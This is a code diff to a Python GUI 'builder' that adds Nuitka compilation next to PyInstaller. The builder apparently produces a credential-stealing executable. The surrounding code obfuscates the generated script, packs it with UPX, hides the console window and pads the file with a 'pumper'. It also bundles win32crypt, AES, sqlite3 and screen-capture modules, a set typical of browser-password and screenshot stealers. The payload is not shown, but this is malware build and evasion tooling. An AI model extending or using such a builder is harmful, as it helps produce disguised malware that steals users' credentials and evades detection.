@@ -14,6 +14,7 @@ import customtkinter
 import pyuac
 import requests
 from PIL import Image
+import sys
 
 logging.basicConfig(
     level=logging.DEBUG,
@@ -209,7 +210,7 @@ class App(customtkinter.CTk):
                                                 fg_color="#5d11c3", hover_color="#5057eb")
         self.clipboard.grid(row=1, column=0, sticky="nw", padx=286, pady=328)
 
-        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", ".py"],
+        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["nuitka", "pyinstaller", ".py"],
                                                     font=customtkinter.CTkFont(size=32, family=self.font), width=250, height=45,
                                                     fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=self.multi_commands)
         self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=365)
@@ -309,7 +310,7 @@ class App(customtkinter.CTk):
             self.pump_size.configure(state="disabled")
 
     def multi_commands(self, value):
-        if value == "pyinstaller":
+        if value in ["nuitka", "pyinstaller"]:
             self.check_icon()
         elif value == ".py":
             self.check_icon()
@@ -324,7 +325,7 @@ class App(customtkinter.CTk):
             self.browser.select()
 
     def check_icon(self):
-        if self.fileopts.get() == "pyinstaller":
+        if self.fileopts.get() in ["pyinstaller", "nuitka"]:
             self.icon.configure(state="normal")
         elif self.fileopts.get() == ".py":
             self.icon.configure(state="disabled")
@@ -396,12 +397,12 @@ class App(customtkinter.CTk):
 
     def reset_build_button(self):
         self.build.configure(width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
-                             fg_color="#5d11c3", hover_color="#5057eb")
+                             fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
 
     def building_button_thread(self, thread):
         while thread.is_alive():
             for i in [".", "..", "..."]:
-                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
+                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#5d11c3", hover_color="#5057eb", command=None)
                 time.sleep(0.3)
                 self.update()
 
@@ -460,8 +461,8 @@ class App(customtkinter.CTk):
                 exeicon = self.iconpath
 
             if filetype == "pyinstaller":
-                subprocess.run(["python", "./tools/upx.py"])
-                subprocess.run(["python", "-m", "PyInstaller",
+                subprocess.run(["./.venv/Scripts/python", "./tools/upx.py"])
+                subprocess.run(["./.venv/Scripts/python", "-m", "PyInstaller",
                                 "--onefile", "--clean", "--noconsole",
                                 "--upx-dir=./tools", "--distpath=./",
                                 "--hidden-import", "base64",
@@ -482,9 +483,51 @@ class App(customtkinter.CTk):
                                 "--hidden-import", "Cryptodome.Cipher",
                                 "--hidden-import", "Cryptodome.Cipher.AES",
                                 "--hidden-import", "win32crypt",
-                                "--icon", exeicon, f"./{filename}.py"])
+                                "--icon", exeicon, f"./{filename}.py"]
+                               )
     
                 logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
+                
+            if filetype == "nuitka":
+                if sys.version_info[:2] > (3, 11):
+                    print("Nuitka does not support Python 3.12")
+                    logging.error("Nuitka does not support Python 3.12")
+                    return
+                else:
+                    try:
+                        if exeicon != "NONE":
+                            # If exeicon is not None, set the icon parameter
+                            subprocess.run([
+                                "./.venv/Scripts/python", "-m", "nuitka",
+                                "--onefile", "--standalone", "--remove-output",
+                                "--show-progress", "--prefer-source-code", 
+                                "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
+                                "--include-module=sqlite3", "--include-module=psutil",
+                                "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
+                                "--include-module=requests_toolbelt", "--include-module=win32crypt",                                
+                                "--assume-yes-for-downloads",
+                                f"--windows-icon-from-ico={exeicon}",
+                                "--windows-disable-console",
+                                f"./{filename}.py"
+                            ])
+                        else:
+                            # If exeicon is None, run without setting the icon parameter
+                            subprocess.run([
+                                "./.venv/Scripts/python", "-m", "nuitka",
+                                "--onefile", "--standalone", "--remove-output",
+                                "--show-progress", "--prefer-source-code",
+                                "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
+                                "--include-module=sqlite3", "--include-module=psutil",
+                                "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
+                                "--include-module=requests_toolbelt", "--include-module=win32crypt",
+                                "--assume-yes-for-downloads",
+                                "--windows-disable-console",
+                                f"./{filename}.py"
+                            ])
+                        logging.info(f"Successfully compiled {filename}.exe with nuitka")    
+                    except Exception as e:
+                        logging.error(f"Error with compiling file: {e}")
+                
         except Exception as e:
             logging.error(f"Error with compiling file: {e}")
 
@@ -541,6 +584,20 @@ class App(customtkinter.CTk):
                 self.write_and_obfuscate(filename)
 
                 thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
+                thread.start()
+                self.building_button_thread(thread)
+
+                if self.pump.get() == 1:
+                    self.file_pumper(filename, "exe", self.get_mb())
+
+                self.built_file()
+                self.builder_frame.after(3000, self.reset_build_button)
+                self.cleanup_files(filename)
+                
+            elif self.get_filetype() == "nuitka":
+                self.write_and_obfuscate(filename)
+
+                thread = threading.Thread(target=self.compile_file, args=(filename, "nuitka",))
                 thread.start()
                 self.building_button_thread(thread)
 
